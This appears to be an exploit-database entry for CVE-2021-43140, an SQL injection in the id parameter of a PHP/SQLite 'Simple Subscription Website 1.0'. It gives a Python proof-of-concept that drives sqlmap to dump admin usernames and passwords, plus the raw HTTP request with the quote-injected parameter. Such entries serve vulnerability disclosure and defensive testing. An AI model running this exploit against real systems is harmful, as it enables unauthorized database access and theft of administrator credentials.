# Exploit Title: Simple Subscription Website 1.0 - SQLi blind injection, vulnerable parameter (id).
# Exploit Author: nu11secur1ty
# Vendor Homepage: https://www.sourcecodester.com/users/tips23
# Software Link: https://www.sourcecodester.com/php/15013/simple-subscription-website-admin-panel-php-and-sqlite-source-code.html
# Version: Simple Subscription Website 1.0
# Tested on: Windows, xampp
# CVE: CVE-2021-43140

[+] PoC:

#!/usr/bin/python
import os
# nu11secur1ty
#Environment
os.system('cd C:\\Users\venvaropt\\Desktop\\CVE\\sqlmap')
#Exploit
os.system('python C:\\Users\venvaropt\\Desktop\\CVE\\sqlmap\\sqlmap.py -r C:\\Users\\venvaropt\\Desktop\\CVE-2021-43140\\nu11secur1ty.txt --batch --answers="crack=N,dict=N,continue=Y,quit=N" --dbms=SQLite -T admin_list -C username,password --dump')

[+] PoC Plugin:
GET /plan_application/?page=apply&id=4' HTTP/1.1
Host: 192.168.1.2
Cookie: PHPSESSID=jtble9h28f0v3kh3op1ivmm9k4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Upgrade-Insecure-Requests: 1
Referer: http://192.168.1.2/plan_application/?page=view_plan&id=4
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Connection: close
Cache-Control: max-age=0

[+] Description:
The id parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the id parameter, and a general error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.

[+] Reproduce:
https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-43140

[+] Proof:
https://streamable.com/hxbqz4
